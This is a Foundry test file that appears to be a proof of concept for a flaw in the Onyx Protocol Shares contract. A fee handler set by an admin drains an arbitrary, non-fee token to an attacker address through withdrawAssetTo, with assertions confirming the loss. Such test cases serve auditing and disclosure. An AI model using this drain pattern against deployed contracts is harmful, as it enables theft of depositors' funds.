// SPDX-License-Identifier: BUSL-1.1

/*
    This file is part of the Onyx Protocol.

    (c) Enzyme Foundation <foundation@enzyme.finance>

    For the full license information, please view the LICENSE
    file that was distributed with this source code.
*/

pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Shares} from "src/shares/Shares.sol";
import {ValuationHandler} from "src/components/value/ValuationHandler.sol";

import {MockERC20} from "test/mocks/MockERC20.sol";
import {FeeHandlerHarness} from "test/harnesses/FeeHandlerHarness.sol";

contract FeeHandlerArbitraryWithdrawTest is Test {
    Shares shares;
    address owner;
    address admin;
    ValuationHandler valuationHandler;

    function setUp() public {
        // Deploy core Shares
        shares = new Shares();
        owner = makeAddr("owner");
        shares.init({_owner: owner, _name: "Test Shares", _symbol: "TST", _valueAsset: keccak256("USD")});

        admin = makeAddr("admin");
        vm.prank(owner);
        shares.addAdmin(admin);

        // Deploy and set valuation handler (needed by FeeHandler.claimFees paths, though not used here)
        valuationHandler = new ValuationHandler();
        vm.prank(admin);
        shares.setValuationHandler(address(valuationHandler));
    }

    function test_feeHandler_canWithdrawArbitraryAsset_direct() public {
        // Setup tokens: feeAsset (legit) and victimAsset (arbitrary)
        MockERC20 feeAsset = new MockERC20(18);
        MockERC20 victimAsset = new MockERC20(18);

        uint256 victimSeed = 1_000e18;
        uint256 feeSeed = 500e18;
        victimAsset.mintTo(address(shares), victimSeed);
        feeAsset.mintTo(address(shares), feeSeed);

        // Deploy a fee handler (harness implements IComponentProxy for SHARES wiring) and set on Shares
        FeeHandlerHarness mal = new FeeHandlerHarness(address(shares));
        vm.prank(admin);
        shares.setFeeHandler(address(mal));

        // Victim user to receive drained assets
        address attacker = makeAddr("attacker");

        // Pre-assert balances
        assertEq(IERC20(address(victimAsset)).balanceOf(address(shares)), victimSeed);
        assertEq(IERC20(address(victimAsset)).balanceOf(attacker), 0);

        // Execute the exploit: malicious fee handler calls Shares.withdrawAssetTo for victimAsset
        uint256 drainAmount = 777e18;
        vm.prank(address(mal));
        shares.withdrawAssetTo({_asset: address(victimAsset), _to: attacker, _amount: drainAmount});

        // Post-assert balances: victim asset drained even though it's not the configured feeAsset
        assertEq(IERC20(address(victimAsset)).balanceOf(address(shares)), victimSeed - drainAmount);
        assertEq(IERC20(address(victimAsset)).balanceOf(attacker), drainAmount);
    }
}

